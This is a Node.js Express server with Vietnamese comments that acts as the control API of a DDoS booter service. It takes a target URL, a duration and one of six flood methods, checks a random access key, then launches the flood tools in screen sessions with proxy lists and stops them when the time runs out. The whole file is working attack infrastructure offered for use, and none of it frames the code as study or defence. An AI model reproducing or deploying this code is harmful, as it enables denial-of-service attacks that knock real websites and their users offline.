const express = require('express');
const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const app = express();
const port = 4320;

// Hàm tạo key ngẫu nhiên
const generateRandomKey = () => {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let key = '';
  const keyLength = 20; 
  for (let i = 0; i < keyLength; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    key += characters.charAt(randomIndex);
  }
  return key;
}

// Tạo key ngẫu nhiên ban đầu khi khởi động API
let key = generateRandomKey();

// Hàm lấy địa chỉ IP của VPS
const getIPAddress = () => {
  const interfaces = os.networkInterfaces();
  for (const key in interfaces) {
    const iface = interfaces[key];
    for (let i = 0; i < iface.length; i++) {
      const alias = iface[i];
      if (alias.family === 'IPv4' && !alias.internal) {
        return alias.address;
      }
    }
  }
  return 'localhost'; // Trả về localhost nếu không tìm thấy địa chỉ IP nào
};

// Lấy địa chỉ IP của VPS
const IPAddress = getIPAddress();

// Hàm xóa nội dung của tệp attack.txt
const clearAttackFile = () => {
  fs.writeFile('attack.txt', '', 'utf8', (err) => {
    if (err) {
      console.error(err);
    }
  });
};

// Cập nhật để xóa nội dung trong tệp attack.txt sau khi cuộc tấn công đã kết thúc
const clearAttackAfterTime = (time) => {
  setTimeout(() => {
    clearAttackFile();
  }, time * 1000);
};

// Lệnh dừng cuộc tấn công
app.get('/stop', (req, res) => {
  const stopCommand = `screen -ls | grep DDOS | cut -d. -f1 | awk '{print $1}' | xargs -I % screen -X -S % quit`;
  exec(stopCommand, (error, stdout, stderr) => {
    if (error) {
      res.status(500).send('Lỗi khi dừng cuộc tấn công DDOS');
      return;
    }
    res.send('Đã dừng tất cả các cuộc tấn công DDOS thành công');
    // Sau khi dừng các session "DDOS", xóa nội dung của tệp attack.txt
    clearAttackFile();
  });
});

// Lấy trạng thái cuộc tấn công
app.get('/status', (req, res) => {
  fs.readFile('attack.txt', 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send('Lỗi khi đọc tệp attack.txt');
      return;
    }
    const status = data.trim() === '' ? 'Không có cuộc tấn công nào đang diễn ra' : `Đang tấn công mục tiêu: ${data}`;
    res.send(status);
  });
});

// Lấy key ngẫu nhiên mới
app.get('/get-key', (req, res) => {
  key = generateRandomKey();
  res.send(`Key mới: ${key}`);
});

// sử lý attack
app.get('/', (req, res) => {
  const host = req.query.host || '';
  const time = req.query.time || '';
  let method = req.query.method || ''; 
  const clientkey = req.query.key || '';

  if (host && time && method) {
    // Kiểm tra key hợp lệ
    if (clientkey !== key) {
      res.status(401).send('Bạn không có quyền truy cập API');
      return;
    }

    // Chuyển method về chữ thường
    method = method.toLowerCase();

    // Kiểm tra xem method có hợp lệ hay không
    const supportedmethods = ['tls-bypass', 'http-medusa', 'http-flood', 'http-storm', 'raw-http', 'query'];
    if (!supportedmethods.includes(method)) {
      res.status(400).send(`Method không hợp lệ`);
      return;
    }

    // Kiểm tra tính hợp lệ của host
    if (!isValidhost(host)) {
      res.status(400).send('host không hợp lệ');
      return;
    }

    // Kiểm tra tính hợp lệ của tham số time
    if (!isValidTime(time)) {
      res.status(400).send('Time không hợp lệ');
      return;
    }

    // Đọc tệp attack.txt để kiểm tra xem đã có cuộc tấn công nào hay không
    fs.readFile('attack.txt', 'utf8', (err, data) => {
      if (err) {
        console.error(err);
        res.status(500).send('Lỗi khi đọc tệp attack.txt');
        return;
      }

      if (data.trim() !== '') {
        // Tệp attack.txt không rỗng, báo cho người dùng đang tấn công mục tiêu nào
        res.status(400).send(`Đang tấn công mục tiêu: ${data}, vui lòng thử lại sau.`);
        return;
      }

      // Ghi thông tin cuộc tấn công vào tệp attack.txt
      fs.writeFile('attack.txt', `${host} trong ${time} giây bằng method ${method}`, 'utf8', (err) => {
        if (err) {
          console.error(err);
          res.status(500).send('Lỗi khi ghi tệp attack.txt');
          return;
        }

        // Chọn lệnh attack tương ứng với method
        let attackCommand = '';
        if (method === 'tls-bypass') {
          attackCommand = `screen -S DDOS -dm node TLS-BYPASS.js ${host} ${time} 30 proxies.txt 30`;
        } else if (method === 'http-medusa') {
          attackCommand = `screen -S DDOS -dm ./HTTP-MEDUSA ${host} ${time} 30 30`;
        } else if (method === 'http-flood') {
          attackCommand = `screen -S DDOS -dm ./BetaV2 ${host} ${time} 30 30 proxies.txt`;
        } else if (method === 'http-storm') {
          attackCommand = `screen -S DDOS -dm ./BetaV2 ${host} ${time} 30 30 vip.txt`;
        } else if (method === 'raw-http') {
          attackCommand = `screen -S DDOS -dm node RAW-HTTP.js ${host} ${time} 30 proies.txt 30`;
        } else if (method === 'query') {
          attackCommand = `screen -S DDOS -dm node Query.js ${host} ${time} 64 30 vip.txt yes`;
        }

        // Khởi động cuộc tấn công
        if (attackCommand) {
          exec(attackCommand, (error, stdout, stderr) => {
            if (error) {
              res.status(500).send(`Lỗi khi khởi động cuộc tấn công`);
              return;
            }
            res.send(`Bắt đầu tấn công mục tiêu: ${host} trong ${time} giây bằng method ${method}`);
            
            // Thiết lập hẹn giờ để xóa nội dung trong file attack.txt sau khi cuộc tấn công kết thúc
            clearAttackAfterTime(time);

            // Thiết lập hẹn giờ để dừng cuộc tấn công sau khi hết thời gian
            setTimeout(() => {
              const stopCommand = `screen -ls | grep DDOS | cut -d. -f1 | awk '{print $1}' | xargs -I % screen -X -S % quit`;
              exec(stopCommand, (error, stdout, stderr) => {
                if (error) {
                  console.error(error);
                }
                // Sau khi dừng các session "DDOS", xóa nội dung của tệp attack.txt
                clearAttackFile();
              });
            }, time * 1000);
          });
        }
      });
    });
  } else {
    res.status(400).send('Thiếu tham số host hoặc time hoặc method');
  }

  // Hàm kiểm tra tính hợp lệ của host
  function isValidhost(host) {
    // Kiểm tra tính hợp lệ của host, ví dụ: có http:// hoặc https://
    const validhostRegex = /^(http|https):\/\//i;
    return validhostRegex.test(host);
  }

  // Hàm kiểm tra tính hợp lệ của tham số time
  function isValidTime(time) {
    // Kiểm tra xem time có phải là số nguyên dương không
    const isPositiveInteger = /^[1-9]\d*$/.test(time);
    return isPositiveInteger;
  }
});

// Endpoint để lấy key ngẫu nhiên ban đầu và địa chỉ IP của VPS
app.get('/get-info', (req, res) => {
  res.send(`http://${IPAddress}:${port}/?key=${key}&host=[host]&time=[time]&method=[method]`);
});

app.listen(port, () => {
  console.log(`\n   API: http://${IPAddress}:${port}/?key=${key}&host=[host]&time=[time]&method=[method]`);
  console.log(`   Key: ${key}`);
});
